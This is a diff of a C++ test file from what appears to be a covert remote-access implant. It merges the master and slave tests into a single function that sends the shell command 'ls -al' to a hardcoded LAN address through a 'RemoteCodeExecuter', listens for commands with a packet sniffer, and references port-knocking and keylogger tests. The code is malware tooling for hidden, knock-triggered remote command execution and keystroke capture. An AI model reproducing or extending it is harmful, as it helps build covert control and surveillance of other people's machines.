@@ -90,22 +90,13 @@ void testKnock() {
     netEngine.stopSniff();
 }
 
-void testRceMaster() {
+void testRce() {
     struct in_addr daddr;
     daddr.s_addr = 0xc0a80011;
 
     NetworkEngine netEngine(interfaceName, key, knockPattern, knockPort, knockDuration);
 
     RemoteCodeExecuter::sendCommand(&netEngine, daddr, "ls -al");
-
-    netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
-    netEngine.startSniff("ip and tcp");
-    sleep(30);
-    netEngine.stopSniff();
-}
-
-void testRceSlave() {
-    NetworkEngine netEngine(interfaceName, key, knockPattern, knockPort, knockDuration);
 
     netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
     netEngine.startSniff("ip and tcp");
@@ -120,7 +111,7 @@ int main(int argc, char *argv[]) {
     // testKeylogger();
     // testNet();
     // testKnock();
-    testRceSlave();
+    testRce();
 
     return 0;
 }
